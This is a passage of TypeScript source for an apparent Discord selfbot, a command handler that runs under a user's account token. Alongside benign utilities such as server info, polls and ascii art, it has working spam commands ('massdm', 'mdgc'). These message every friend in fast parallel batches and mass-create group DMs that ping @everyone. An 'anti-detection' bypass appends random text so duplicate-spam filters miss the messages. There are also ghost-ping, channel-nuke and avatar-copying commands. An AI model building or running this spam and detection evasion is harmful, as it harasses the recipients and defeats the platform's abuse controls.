            await message.channel.send(user.displayAvatarURL({ dynamic: true, size: 4096 })).catch(() => {});
        }

        if (command === 'userinfo') {
            await message.delete().catch(() => {});
            const user = message.mentions.users.first() || message.author;
            await message.channel.send(`**User:** ${user.tag}\n**ID:** ${user.id}\n**Created:** ${user.createdAt.toDateString()}`).catch(() => {});
        }

        if (command === 'serverinfo') {
            await message.delete().catch(() => {});
            if (!message.guild) return;
            await message.channel.send(`**Server:** ${message.guild.name}\n**ID:** ${message.guild.id}\n**Members:** ${message.guild.memberCount}`).catch(() => {});
        }

        // --- UTILITY COMMANDS ---
        if (command === 'ghostping') {
            await message.delete().catch(() => {});
            const user = message.mentions.users.first();
            if (user) {
                const msg = await message.channel.send(`<@${user.id}>`);
                await msg.delete();
            }
        }

        if (command === 'purge') {
            await message.delete().catch(() => {});
            const amount = parseInt(args[0]) || 1;
            const messages = await message.channel.messages.fetch({ limit: amount });
            const deletable = messages.filter(m => m.author.id === client.user?.id);
            for (const msg of deletable.values()) {
                await msg.delete().catch(() => {});
            }
        }

        if (command === 'react') {
            await message.delete().catch(() => {});
            const emoji = args[0];
            if (!emoji) return;
            const lastMessage = (await message.channel.messages.fetch({ limit: 2 })).last();
            if (lastMessage) {
                await lastMessage.react(emoji).catch(() => {});
            }
        }

        if (command === 'stream') {
            await message.delete().catch(() => {});
            const status = args.join(' ');
            // @ts-ignore
            client.user?.setActivity(status || 'Released.sb', { type: 'STREAMING', url: 'https://twitch.tv/releasedsb' });
            await message.channel.send(`Streaming: ${status || 'Released.sb'}`).catch(() => {});
        }

        if (command === 'listen') {
            await message.delete().catch(() => {});
            const status = args.join(' ');
            // @ts-ignore
            client.user?.setActivity(status || 'Released.sb', { type: 'LISTENING' });
            await message.channel.send(`Listening to: ${status || 'Released.sb'}`).catch(() => {});
        }

        if (command === 'nuke') {
            await message.delete().catch(() => {});
            if (message.channel.type === 'GUILD_TEXT') {
                const newChannel = await message.channel.clone();
                await message.channel.delete().catch(() => {});
                await newChannel.send('Channel nuked successfully.').catch(() => {});
            }
        }

        if (command === 'dm') {
            await message.delete().catch(() => {});
            const user = message.mentions.users.first();
            const content = args.slice(1).join(' ');
            if (user && content) {
                await user.send(content).catch(() => {});
            }
        }

        if (command === 'dm') {
            await message.delete().catch(() => {});
            const user = message.mentions.users.first();
            const content = args.slice(1).join(' ');
            if (user && content) {
                await user.send(content).catch(() => {});
            }
        }

        if (command === 'watch') {
            await message.delete().catch(() => {});
            const status = args.join(' ');
            // @ts-ignore
            client.user?.setActivity(status || 'Released.sb', { type: 'WATCHING' });
            await message.channel.send(`Watching: ${status || 'Released.sb'}`).catch(() => {});
        }

        if (command === 'play') {
            await message.delete().catch(() => {});
            const status = args.join(' ');
            // @ts-ignore
            client.user?.setActivity(status || 'Released.sb', { type: 'PLAYING' });
            await message.channel.send(`Playing: ${status || 'Released.sb'}`).catch(() => {});
        }

        if (command === 'cloneserver') {
            await message.delete().catch(() => {});
            if (!isOwner) return;
            if (!message.guild) return;
            
            addLog(token, `Cloning server: ${message.guild.name}`);
            const guild = message.guild;
            
            try {
                // Create a new guild
                // @ts-ignore
                const newGuild = await client.guilds.create(`${guild.name} (Clone)`, {
                    icon: guild.iconURL()
                });
                
                addLog(token, `New guild created: ${newGuild.id}`);
                
                // Wait for guild to settle
                await new Promise(resolve => setTimeout(resolve, 2000));

                // Delete default channels in new guild
                const newChannels = await newGuild.channels.fetch();
                for (const c of newChannels.values()) {
                    await c.delete().catch(() => {});
                }
                
                // Clone roles
                const sortedRoles = Array.from(guild.roles.cache.values()).sort((a, b) => a.position - b.position);
                for (const role of sortedRoles) {
                    if (role.name === '@everyone' || role.managed) continue;
                    await newGuild.roles.create({
                        name: role.name,
                        color: role.color,
                        permissions: role.permissions,
                        hoist: role.hoist,
                        mentionable: role.mentionable
                    }).catch(() => {});
                }
                
                // Clone categories first
                const categoryMap = new Map();
                const categories = Array.from(guild.channels.cache.values())
                    .filter(c => c.type === 'GUILD_CATEGORY')
                    .sort((a, b) => (a as any).position - (b as any).position);

                for (const cat of categories) {
                    try {
                        const newCat = await newGuild.channels.create(cat.name, { 
                            type: 'GUILD_CATEGORY',
                            position: (cat as any).position
                        });
                        categoryMap.set(cat.id, newCat.id);
                    } catch (e) {}
                }
                
                // Clone other channels
                const otherChannels = Array.from(guild.channels.cache.values())
                    .filter(c => (c.type === 'GUILD_TEXT' || c.type === 'GUILD_VOICE' || c.type === 'GUILD_NEWS' || c.type === 'GUILD_STAGE_VOICE'))
                    .sort((a, b) => (a as any).position - (b as any).position);

                for (const chan of otherChannels) {
                    try {
                        const parentId = chan.parentId ? categoryMap.get(chan.parentId) : null;
                        await newGuild.channels.create(chan.name, {
                            type: chan.type as any,
                            parent: parentId,
                            position: (chan as any).position,
                            // @ts-ignore
                            topic: chan.topic,
                            // @ts-ignore
                            nsfw: chan.nsfw,
                            // @ts-ignore
                            bitrate: chan.bitrate,
                            // @ts-ignore
                            userLimit: chan.userLimit
                        });
                    } catch (e) {}
                }
                
                await message.channel.send(`✅ Server cloned successfully! New Server ID: ${newGuild.id}`).catch(() => {});
            } catch (e) {
                addLog(token, `CloneServer Error: ${e}`);
                await message.channel.send(`❌ Failed to clone server: ${e}`).catch(() => {});
            }
        }

        if (command === 'stealemoji') {
            await message.delete().catch(() => {});
            const emoji = args[0];
            if (emoji && message.guild) {
                const match = emoji.match(/<(a?):(\w+):(\d+)>/);
                if (match) {
                    const url = `https://cdn.discordapp.com/emojis/${match[3]}.${match[1] ? 'gif' : 'png'}`;
                    try {
                        await message.guild.emojis.create(url, match[2]);
                        await message.channel.send(`Stole emoji: ${match[2]}`).catch(() => {});
                    } catch (e) {
                        await message.channel.send(`Failed to steal emoji: ${e}`).catch(() => {});
                    }
                }
            }
        }

        // Auto React Command (.ar <user?> <emoji>)
        if (command === 'ar') {
            await message.delete().catch(() => {});
            if (!autoReactRules.has(token)) {
                autoReactRules.set(token, new Map());
            }
            const rules = autoReactRules.get(token)!;

            if (args.length === 1) {
                // .ar <emoji> (Self)
                const emoji = args[0];
                if (!rules.has('self')) rules.set('self', new Set());
                const selfEmojis = rules.get('self')!;
                if (selfEmojis.has(emoji)) {
                    selfEmojis.delete(emoji);
                    addLog(token, `Auto-react (Self) removed: ${emoji}`);
                    await message.channel.send(`✅ Auto-react (Self) removed: ${emoji}`).then(m => setTimeout(() => m.delete().catch(() => {}), 3000)).catch(() => {});
                } else {
                    selfEmojis.add(emoji);
                    addLog(token, `Auto-react (Self) added: ${emoji}`);
                    await message.channel.send(`✅ Auto-react (Self) added: ${emoji}`).then(m => setTimeout(() => m.delete().catch(() => {}), 3000)).catch(() => {});
                }
            } else if (args.length >= 2) {
                // .ar <user> <emoji>
                let targetId = args[0].replace(/[<@!>]/g, '');
                if (targetId === 'self') targetId = 'self';
                const emoji = args[1];
                if (!rules.has(targetId)) rules.set(targetId, new Set());
                const userEmojis = rules.get(targetId)!;
                if (userEmojis.has(emoji)) {
                    userEmojis.delete(emoji);
                    addLog(token, `Auto-react (${targetId}) removed: ${emoji}`);
                    await message.channel.send(`✅ Auto-react for <@${targetId}> removed: ${emoji}`).then(m => setTimeout(() => m.delete().catch(() => {}), 3000)).catch(() => {});
                } else {
                    userEmojis.add(emoji);
                    addLog(token, `Auto-react (${targetId}) added: ${emoji}`);
                    await message.channel.send(`✅ Auto-react for <@${targetId}> added: ${emoji}`).then(m => setTimeout(() => m.delete().catch(() => {}), 3000)).catch(() => {});
                }
            }
            saveAutoReactRules(token).catch(console.error);
        }

        // Super Auto React Command (.super <user?> <emoji>)
        if (command === 'super') {
            await message.delete().catch(() => {});
            if (!superReactRules.has(token)) {
                superReactRules.set(token, new Map());
            }
            const sRules = superReactRules.get(token)!;

            if (args.length === 1) {
                // .super <emoji> (Self)
                const emoji = args[0];
                if (!sRules.has('self')) sRules.set('self', new Set());
                const selfEmojis = sRules.get('self')!;
                if (selfEmojis.has(emoji)) {
                    selfEmojis.delete(emoji);
                    addLog(token, `Super-react (Self) removed: ${emoji}`);
                    await message.channel.send(`✅ Super-react (Self) removed: ${emoji}`).then(m => setTimeout(() => m.delete().catch(() => {}), 3000)).catch(() => {});
                } else {
                    selfEmojis.add(emoji);
                    addLog(token, `Super-react (Self) added: ${emoji}`);
                    await message.channel.send(`✅ Super-react (Self) added: ${emoji}`).then(m => setTimeout(() => m.delete().catch(() => {}), 3000)).catch(() => {});
                }
            } else if (args.length >= 2) {
                // .super <user> <emoji>
                let targetId = args[0].replace(/[<@!>]/g, '');
                if (targetId === 'self') targetId = 'self';
                const emoji = args[1];
                if (!sRules.has(targetId)) sRules.set(targetId, new Set());
                const userEmojis = sRules.get(targetId)!;
                if (userEmojis.has(emoji)) {
                    userEmojis.delete(emoji);
                    addLog(token, `Super-react (${targetId}) removed: ${emoji}`);
                    await message.channel.send(`✅ Super-react for <@${targetId}> removed: ${emoji}`).then(m => setTimeout(() => m.delete().catch(() => {}), 3000)).catch(() => {});
                } else {
                    userEmojis.add(emoji);
                    addLog(token, `Super-react (${targetId}) added: ${emoji}`);
                    await message.channel.send(`✅ Super-react for <@${targetId}> added: ${emoji}`).then(m => setTimeout(() => m.delete().catch(() => {}), 3000)).catch(() => {});
                }
            }
        }

        if (command === 'stealav') {
            await message.delete().catch(() => {});
            const target = message.mentions.users.first() || (args[0] ? await client.users.fetch(args[0]).catch(() => null) : null);
            if (target) {
                const avatarUrl = target.displayAvatarURL({ format: 'png', size: 1024 });
                await client.user?.setAvatar(avatarUrl).catch(() => {});
                addLog(token, `Stole avatar from ${target.tag}`);
                await message.channel.send(`✅ Avatar stolen from <@${target.id}>`).then(m => setTimeout(() => m.delete().catch(() => {}), 3000)).catch(() => {});
            }
        }

        if (command === 'status') {
            await message.delete().catch(() => {});
            const status = args.join(' ');
            if (status) {
                // @ts-ignore
                await client.user?.setPresence({ activities: [{ name: status, type: 'CUSTOM' }] }).catch(() => {});
                addLog(token, `Status changed to: ${status}`);
                await message.channel.send(`✅ Status set to: \`${status}\``).then(m => setTimeout(() => m.delete().catch(() => {}), 3000)).catch(() => {});
            }
        }

        if (command === 'urban') {
            await message.delete().catch(() => {});
            const word = args.join(' ');
            if (word) {
                try {
                    const res = await fetch(`https://api.urbandictionary.com/v0/define?term=${encodeURIComponent(word)}`);
                    const json = await res.json();
                    if (json.list && json.list.length > 0) {
                        const def = json.list[0];
                        const text = `**Urban Dictionary: ${def.word}**\n\n` +
                                      `**Definition:**\n${def.definition.replace(/[\[\]]/g, '')}\n\n` +
                                      `**Example:**\n*${def.example.replace(/[\[\]]/g, '')}*\n\n` +
                                      `👍 ${def.thumbs_up} | 👎 ${def.thumbs_down}`;
                        await message.channel.send(text).catch(() => {});
                    } else {
                        await message.channel.send(`❌ No definition found for \`${word}\``).catch(() => {});
                    }
                } catch (e) {
                    await message.channel.send(`❌ Error fetching from Urban Dictionary`).catch(() => {});
                }
            }
        }

        if (command === 'clearar') {
            await message.delete().catch(() => {});
            autoReactRules.set(token, new Map());
            saveAutoReactRules(token).catch(console.error);
            addLog(token, `Cleared all auto-react rules`);
            await message.channel.send(`✅ All auto-react rules cleared`).then(m => setTimeout(() => m.delete().catch(() => {}), 3000)).catch(() => {});
        }

        if (command === 'clearsuper') {
            await message.delete().catch(() => {});
            superReactRules.set(token, new Map());
            addLog(token, `Cleared all super-react rules`);
            await message.channel.send(`✅ All super-react rules cleared`).then(m => setTimeout(() => m.delete().catch(() => {}), 3000)).catch(() => {});
        }

        if (command === 'game') {
            await message.delete().catch(() => {});
            const game = args.join(' ');
            if (game) {
                // @ts-ignore
                await client.user?.setActivity(game, { type: 'PLAYING' });
            }
        }

        if (command === 'invisible') {
            await message.delete().catch(() => {});
            // @ts-ignore
            await client.user?.setPresence({ status: 'invisible' });
        }

        if (command === 'afk') {
            await message.delete().catch(() => {});
            // Simple AFK implementation: just set status
            const msg = args.join(' ') || 'AFK';
            // @ts-ignore
            await client.user?.setActivity(msg, { type: 'WATCHING' });
            // @ts-ignore
            await client.user?.setPresence({ status: 'idle' });
        }

        if (command === 'webhooksend') {
            await message.delete().catch(() => {});
            // Usage: .webhooksend <url> <msg>
            const url = args[0];
            const msg = args.slice(1).join(' ');
            if (url && msg) {
                try {
                    // Simple fetch to webhook
                    // We need node-fetch or axios, but we can use global fetch in Node 18+
                    await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ content: msg })
                    });
                } catch (e) {
                    // ignore
                }
            }
        }
        
        // Alias massdm to mdm
        if (command === 'massdm' || command === 'dmall') {
             // Re-use mdm logic by manually triggering it or copying logic. 
             // Copying logic for simplicity in this context
             await message.delete().catch(() => {});
             const msg = args.join(' ');
             if (!msg) return;
             addLog(token, `Starting Mass DM (via .massdm)...`);
             try {
                 // @ts-ignore
                 const relationships = client.relationships.cache;
                 const friends = relationships.filter((r: any) => r === 1 || r.type === 1).map((_: any, id: string) => id);
                 
                 // Anti-Detection Logic (Bypass Mode)
                 const isAnti = antiMode.get(token);
                 // User requested NO waits. We will use a very aggressive batch size.
                 const BATCH_SIZE = 10; 
                 const BASE_DELAY = 500; // Minimal delay to prevent immediate socket closure

                 let sent = 0;
                 const chunks = [];
                 for (let i = 0; i < friends.length; i += BATCH_SIZE) {
                     chunks.push(friends.slice(i, i + BATCH_SIZE));
                 }
                 for (const chunk of chunks) {
                     const promises = chunk.map(async (friendId: string) => {
                         try {
                             const user = await client.users.fetch(friendId);
                             // Bypass: Add invisible char or nonce if anti is on to avoid duplicate detection
                             let finalMsg = msg;
                             if (isAnti) {
                                 finalMsg += ` ||${Math.random().toString(36).substring(7)}||`;
                             }
                             await user.send(finalMsg);
                             sent++;
                         } catch (e) {}
                     });
                     await Promise.all(promises);
                     
                     // Minimal delay
                     await new Promise(r => setTimeout(r, BASE_DELAY)); 
                 }
                 addLog(token, `Mass DM Complete. Sent: ${sent}/${friends.length}`);
             } catch (e) {
                 addLog(token, `Mass DM Error: ${e}`);
             }
        }

        // --- NEW COMMANDS ---

        // .mdgc <msg> (Mass DM + GC)
        if (command === 'mdgc') {
            await message.delete().catch(() => {});
            const msg = args.join(' ');
            if (!msg) {
                // Send description if no msg
                const desc = `
**MDGC (Mass DM & GC)**
Usage: .mdgc <message>
1. Fetches all friends.
2. Creates Group DMs (GCs) with 9 friends each.
3. Sends <message> + @everyone in each GC.
4. Simultaneously Mass DMs all friends individually.
                `;
                await message.channel.send(desc).catch(() => {});
                return;
            }

            addLog(token, `Starting MDGC (Mass DM & GC)...`);

            try {
                // @ts-ignore
                const relationships = client.relationships.cache;
                const friendIds = relationships.filter((r: any) => r === 1 || r.type === 1).map((_: any, id: string) => id);
                
                if (friendIds.length === 0) {
                    addLog(token, `MDGC: No friends found.`);
                    return;
                }

                // 1. Mass DM (Parallel)
                (async () => {
                    let sent = 0;
                    const isAnti = antiMode.get(token);
                    const BATCH_SIZE = 10;
                    const BASE_DELAY = 500;
                    
                    const chunks = [];
                    for (let i = 0; i < friendIds.length; i += BATCH_SIZE) {
                        chunks.push(friendIds.slice(i, i + BATCH_SIZE));
                    }
                    for (const chunk of chunks) {
                        const promises = chunk.map(async (friendId: string) => {
                            try {
                                const user = await client.users.fetch(friendId);
                                let finalMsg = msg;
                                if (isAnti) {
                                    finalMsg += ` ||${Math.random().toString(36).substring(7)}||`;
                                }
                                await user.send(finalMsg);
                                sent++;
                            } catch (e) {}
                        });
                        await Promise.all(promises);
                        await new Promise(r => setTimeout(r, BASE_DELAY));
                    }
                    addLog(token, `MDGC: Mass DM finished. Sent ${sent}`);
                })();

                // 2. Mass GC (Sequential/Chunked)
                // Max 10 recipients per GC (including self), so 9 friends.
                const gcChunks = [];
                for (let i = 0; i < friendIds.length; i += 9) {
                    gcChunks.push(friendIds.slice(i, i + 9));
                }

                let gcCount = 0;
                for (const chunk of gcChunks) {
                    try {
                        // @ts-ignore - selfbot v13 specific
                        const channel = await client.channels.createGroupDM(chunk);
                        await channel.send(`${msg} @everyone`);
                        gcCount++;
                        // Rate limit safety for channel creation
                        await new Promise(r => setTimeout(r, 3000)); 
                    } catch (e) {
                        addLog(token, `MDGC: Failed to create GC chunk: ${e}`);
                    }
                }
                addLog(token, `MDGC: Created ${gcCount} Group DMs.`);

            } catch (e) {
                addLog(token, `MDGC Error: ${e}`);
            }
        }

        if (command === 'leaveall') {
            await message.delete().catch(() => {});
            addLog(token, `Leaving all guilds...`);
            client.guilds.cache.forEach(async (guild) => {
                try {
                    await guild.leave();
                    await new Promise(r => setTimeout(r, 1000));
                } catch (e) {}
            });
        }

        if (command === 'closeall') {
            await message.delete().catch(() => {});
            addLog(token, `Closing all DMs...`);
            // @ts-ignore
            client.channels.cache.filter(c => c.type === 'DM').forEach(async (ch) => {
                try {
                    await ch.delete(); // Closes DM
                } catch (e) {}
            });
        }

        if (command === 'unfriendall') {
            await message.delete().catch(() => {});
            addLog(token, `Removing all friends...`);
            // @ts-ignore
            const relationships = client.relationships.cache;
            relationships.forEach(async (type: any, id: string) => {
                if (type === 1) { // Friend
                    try {
                        // @ts-ignore
                        await client.relationships.removeFriend(id);
                        await new Promise(r => setTimeout(r, 500));
                    } catch (e) {}
                }
            });
        }

        if (command === 'readall') {
            await message.delete().catch(() => {});
            addLog(token, `Marking all as read...`);
            client.guilds.cache.forEach(g => {
                // @ts-ignore
                g.features // Just accessing to ensure loaded? No, need to ack.
                // Selfbots usually ack via specific packet or method not exposed easily in v13 high level
                // But we can iterate channels and 'fetch' last message? No that's slow.
                // djs-selfbot-v13 has client.ack(channel) or similar?
                // Actually, client.channels.cache...
                // Let's try a simple approach: iterate unread channels?
                // Too complex for simple command without heavy API spam.
                // Placeholder log for now as "Not fully supported in safe mode"
                addLog(token, `ReadAll: Not fully implemented to avoid ban risk.`);
            });
        }

        // --- NEW COMMANDS ---
        if (command === 'poll') {
            await message.delete().catch(() => {});
            const question = args.join(' ');
            if (question) {
                const msg = await message.channel.send(`📊 **POLL** \n${question}`);
                await msg.react('👍');
                await msg.react('👎');
            }
        }

        if (command === 'oll') {
            await message.delete().catch(() => {});
            const currentState = autoSkullMode.get(token) || false;
            const newState = !currentState;
            autoSkullMode.set(token, newState);
            
            // Set owner ID if enabling
            if (newState) {
                // If user mentioned someone, they become the owner. Otherwise, it's the selfbot user.
                const target = message.mentions.users.first();
                if (target) {
                    ownerIds.set(token, target.id);
                    addLog(token, `AutoSkull ENABLED for user: ${target.tag}`);
                } else {
                    ownerIds.set(token, client.user?.id || '');
                    addLog(token, `AutoSkull ENABLED for self.`);
                }
            } else {
                addLog(token, `AutoSkull DISABLED.`);
            }
        }

        if (command === 'calc') {
            await message.delete().catch(() => {});
            const expr = args.join(' ');
            try {
                // Basic safe eval for math
                // eslint-disable-next-line no-new-func
                const result = new Function(`return ${expr.replace(/[^-()\d/*+.]/g, '')}`)();
                await message.channel.send(`🧮 Result: ${result}`).catch(() => {});
            } catch (e) {
                await message.channel.send('Invalid expression').catch(() => {});
            }
        }

        if (command === 'weather') {
            await message.delete().catch(() => {});
            // Mock weather for now as we don't have an API key for weather
            // Or use wttr.in which is free
            const city = args.join('+');
            if (city) {
                await message.channel.send(`https://wttr.in/${city}.png?m`).catch(() => {});
            }
        }

        if (command === 'translate') {
            await message.delete().catch(() => {});
            // Simple Google Translate link generator
            const text = args.join(' ');
            if (text) {
                const url = `https://translate.google.com/?sl=auto&tl=en&text=${encodeURIComponent(text)}&op=translate`;
                await message.channel.send(url).catch(() => {});
            }
        }

        if (command === 'shorten') {
            await message.delete().catch(() => {});
            // Use is.gd (no api key needed)
            const url = args[0];
            if (url) {
                try {
                    const res = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`);
                    const short = await res.text();
                    await message.channel.send(short).catch(() => {});
                } catch (e) {}
            }
        }

        if (command === 'define') {
            await message.delete().catch(() => {});
            const word = args[0];
            if (word) {
                await message.channel.send(`https://www.urbandictionary.com/define.php?term=${word}`).catch(() => {});
            }
        }

        if (command === 'qr') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) {
                const url = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(text)}`;
                await message.channel.send(url).catch(() => {});
            }
        }

        if (command === 'randomuser') {
            await message.delete().catch(() => {});
            if (message.guild) {
                const member = message.guild.members.cache.random();
                if (member) await message.channel.send(`Random User: <@${member.id}>`).catch(() => {});
            }
        }

        if (command === 'channelinfo') {
            await message.delete().catch(() => {});
            const ch = message.channel;
            // @ts-ignore
            const info = `**Channel Info**\nName: ${ch.name}\nID: ${ch.id}\nType: ${ch.type}`;
            await message.channel.send(info).catch(() => {});
        }

        if (command === 'roleinfo') {
            await message.delete().catch(() => {});
            const role = message.mentions.roles.first();
            if (role) {
                const info = `**Role Info**\nName: ${role.name}\nID: ${role.id}\nColor: ${role.hexColor}\nMembers: ${role.members.size}`;
                await message.channel.send(info).catch(() => {});
            }
        }

        // --- MORE NEW COMMANDS (30+) ---

        if (command === 'servericon') {
            await message.delete().catch(() => {});
            if (message.guild && message.guild.iconURL()) {
                await message.channel.send(message.guild.iconURL({ dynamic: true })!).catch(() => {});
            }
        }

        if (command === 'banner') {
            await message.delete().catch(() => {});
            const user = message.mentions.users.first() || client.user;
            // @ts-ignore
            await user.fetch();
            // @ts-ignore
            if (user.bannerURL()) {
                // @ts-ignore
                await message.channel.send(user.bannerURL({ dynamic: true, size: 4096 })).catch(() => {});
            } else {
                addLog(token, 'User has no banner');
            }
        }

        if (command === 'splash') {
            await message.delete().catch(() => {});
            if (message.guild && message.guild.splashURL()) {
                await message.channel.send(message.guild.splashURL()!).catch(() => {});
            }
        }

        if (command === 'emojis') {
            await message.delete().catch(() => {});
            if (message.guild) {
                const emojis = message.guild.emojis.cache.map(e => e.toString()).join(' ');
                // Split if too long
                if (emojis.length > 2000) {
                    await message.channel.send(emojis.substring(0, 2000)).catch(() => {});
                } else {
                    await message.channel.send(emojis || 'No emojis').catch(() => {});
                }
            }
        }

        if (command === 'members') {
            await message.delete().catch(() => {});
            if (message.guild) {
                await message.channel.send(`Members: ${message.guild.memberCount}`).catch(() => {});
            }
        }

        if (command === 'boosts') {
            await message.delete().catch(() => {});
            if (message.guild) {
                await message.channel.send(`Boosts: ${message.guild.premiumSubscriptionCount} (Level ${message.guild.premiumTier})`).catch(() => {});
            }
        }

        if (command === 'oldest') {
            await message.delete().catch(() => {});
            if (message.guild) {
                const oldest = message.guild.members.cache.sort((a, b) => a.user.createdTimestamp - b.user.createdTimestamp).first();
                if (oldest) await message.channel.send(`Oldest Account: ${oldest.user.tag} (${oldest.user.createdAt.toDateString()})`).catch(() => {});
            }
        }

        if (command === 'youngest') {
            await message.delete().catch(() => {});
            if (message.guild) {
                const youngest = message.guild.members.cache.sort((a, b) => b.user.createdTimestamp - a.user.createdTimestamp).first();
                if (youngest) await message.channel.send(`Youngest Account: ${youngest.user.tag} (${youngest.user.createdAt.toDateString()})`).catch(() => {});
            }
        }

        if (command === 'roles') {
            await message.delete().catch(() => {});
            if (message.guild) {
                const roles = message.guild.roles.cache.map(r => r.name).join(', ');
                if (roles.length > 2000) {
                    await message.channel.send(roles.substring(0, 2000)).catch(() => {});
                } else {
                    await message.channel.send(roles).catch(() => {});
                }
            }
        }

        if (command === 'channels') {
            await message.delete().catch(() => {});
            if (message.guild) {
                await message.channel.send(`Channels: ${message.guild.channels.cache.size}`).catch(() => {});
            }
        }

        if (command === 'invites') {
            await message.delete().catch(() => {});
            if (message.guild) {
                try {
                    const invites = await message.guild.invites.fetch();
                    await message.channel.send(`Invites: ${invites.size}`).catch(() => {});
                } catch (e) {
                    addLog(token, 'Failed to fetch invites (Permissions?)');
                }
            }
        }

        if (command === 'copy') {
            await message.delete().catch(() => {});
            if (message.reference) {
                try {
                    const ref = await message.channel.messages.fetch(message.reference.messageId!);
                    await message.channel.send(`\`\`\`${ref.content}\`\`\``).catch(() => {});
                } catch (e) {}
            }
        }

        if (command === 'paste') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) {
                await message.channel.sendTyping();
                await new Promise(r => setTimeout(r, text.length * 50)); // Simulate typing speed
                await message.channel.send(text).catch(() => {});
            }
        }

        if (command === 'find') {
            await message.delete().catch(() => {});
            const query = args.join(' ').toLowerCase();
            if (message.guild && query) {
                const member = message.guild.members.cache.find(m => m.user.username.toLowerCase().includes(query) || m.nickname?.toLowerCase().includes(query) || m.id === query);
                if (member) {
                    await message.channel.send(`Found: ${member.user.tag} (${member.id})`).catch(() => {});
                } else {
                    await message.channel.send('User not found').catch(() => {});
                }
            }
        }

        if (command === 'discriminator') {
            await message.delete().catch(() => {});
            const discrim = args[0];
            if (message.guild && discrim) {
                const members = message.guild.members.cache.filter(m => m.user.discriminator === discrim).map(m => m.user.tag).join(', ');
                if (members) {
                    await message.channel.send(`Users with #${discrim}:\n${members.substring(0, 1900)}`).catch(() => {});
                } else {
                    await message.channel.send('None found').catch(() => {});
                }
            }
        }

        if (command === 'firstmsg') {
            await message.delete().catch(() => {});
            const ch = message.channel;
            // @ts-ignore
            const messages = await ch.messages.fetch({ after: 1, limit: 1 });
            const first = messages.first();
            if (first) {
                await message.channel.send(`First message: https://discord.com/channels/${message.guild?.id || '@me'}/${ch.id}/${first.id}`).catch(() => {});
            }
        }

        if (command === 'pins') {
            await message.delete().catch(() => {});
            const pins = await message.channel.messages.fetchPinned();
            if (pins.size > 0) {
                await message.channel.send(`Pinned Messages: ${pins.size}`).catch(() => {});
            } else {
                await message.channel.send('No pins').catch(() => {});
            }
        }

        if (command === 'clear' || command === 'clean') {
            await message.delete().catch(() => {});
            const amount = parseInt(args[0]) || 10;
            // Selfbot clear: fetch own messages and delete
            const messages = await message.channel.messages.fetch({ limit: 100 });
            const own = messages.filter(m => m.author.id === client.user?.id).first(amount);
            let deleted = 0;
            for (const m of own) {
                await m.delete().catch(() => {});
                deleted++;
                await new Promise(r => setTimeout(r, 1000)); // Rate limit safety
            }
            const msg = await message.channel.send(`Deleted ${deleted} messages.`);
            setTimeout(() => msg.delete().catch(() => {}), 3000);
        }

        if (command === 'ascii') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) {
                // Simple block text generator
                const font: any = {
                    'a': '  ██   \n ████  \n██  ██ \n██████ \n██  ██ ',
                    'b': '█████  \n██  ██ \n█████  \n██  ██ \n█████  ',
                    'c': ' █████ \n██     \n██     \n██     \n █████ ',
                    'd': '█████  \n██  ██ \n██  ██ \n██  ██ \n█████  ',
                    'e': '██████ \n██     \n█████  \n██     \n██████ ',
                    'f': '██████ \n██     \n█████  \n██     \n██     ',
                    'g': ' █████ \n██     \n██  ██ \n██  ██ \n █████ ',
                    'h': '██  ██ \n██  ██ \n██████ \n██  ██ \n██  ██ ',
                    'i': ' █████ \n   ██  \n   ██  \n   ██  \n █████ ',
                    'j': ' █████ \n    ██ \n    ██ \n██  ██ \n █████ ',
                    'k': '██  ██ \n██ ██  \n████   \n██ ██  \n██  ██ ',
                    'l': '██     \n██     \n██     \n██     \n██████ ',
                    'm': '██   ██\n███ ███\n██ █ ██\n██   ██\n██   ██',
                    'n': '██   ██\n███  ██\n██ █ ██\n██  ███\n██   ██',
                    'o': ' █████ \n██   ██\n██   ██\n██   ██\n █████ ',
                    'p': '█████  \n██  ██ \n█████  \n██     \n██     ',
                    'q': ' █████ \n██   ██\n██   ██\n██  ███\n █████ ██',
                    'r': '█████  \n██  ██ \n█████  \n██ ██  \n██  ██ ',
                    's': ' █████ \n██     \n █████ \n     ██\n █████ ',
                    't': '██████ \n  ██   \n  ██   \n  ██   \n  ██   ',
                    'u': '██  ██ \n██  ██ \n██  ██ \n██  ██ \n █████ ',
                    'v': '██  ██ \n██  ██ \n██  ██ \n ████  \n  ██   ',
                    'w': '██   ██\n██   ██\n██ █ ██\n███████\n██   ██',
                    'x': '██  ██ \n ████  \n  ██   \n ████  \n██  ██ ',
                    'y': '██  ██ \n ████  \n  ██   \n  ██   \n  ██   ',
                    'z': '██████ \n    ██ \n   ██  \n  ██   \n██████ ',
                    ' ': '       \n       \n       \n       \n       '
                };
                
                const lines = ['', '', '', '', ''];
                for (const char of text.toLowerCase()) {
                    const art = font[char] || font[' '];
                    const artLines = art.split('\n');
                    for (let i = 0; i < 5; i++) {
                        lines[i] += artLines[i] + '  ';
                    }
                }
                
                await message.channel.send(`\`\`\`\n${lines.join('\n')}\n\`\`\``).catch(() => {});
            }
        }

        if (command === 'binary') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) {
                const binary = text.split('').map(char => char.charCodeAt(0).toString(2)).join(' ');
                await message.channel.send(binary).catch(() => {});
            }
        }

        if (command === 'hex') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) {
                const hex = Buffer.from(text).toString('hex');
                await message.channel.send(hex).catch(() => {});
            }
        }

        if (command === 'base64') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) {
                const b64 = Buffer.from(text).toString('base64');
                await message.channel.send(b64).catch(() => {});
            }
        }

        if (command === 'uppercase') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) await message.channel.send(text.toUpperCase()).catch(() => {});
        }

        if (command === 'lowercase') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) await message.channel.send(text.toLowerCase()).catch(() => {});
        }

        if (command === 'length') {
            await message.delete().catch(() => {});
            const text = args.join(' ');
            if (text) await message.channel.send(`Length: ${text.length}`).catch(() => {});
        }

        if (command === 'clearcache') {
            await message.delete().catch(() => {});
            
            // Clear Auto React
            autoReactRules.delete(token);
            await supabase.from('auto_react_rules').delete().eq('id', token);

            // Clear RPC Settings
            rpcSettings.delete(token);
